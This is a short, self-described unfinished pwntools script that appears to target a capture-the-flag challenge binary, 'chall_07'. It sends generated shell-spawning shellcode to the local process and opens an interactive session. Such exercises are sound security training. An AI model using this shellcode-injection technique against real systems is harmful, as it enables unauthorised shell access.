from pwn import *
binary = context.binary = ELF('./chall_07')
p = process('./chall_07')
p.sendline(asm(shellcraft.sh()))
p.interactive()
# NOT FINISHED
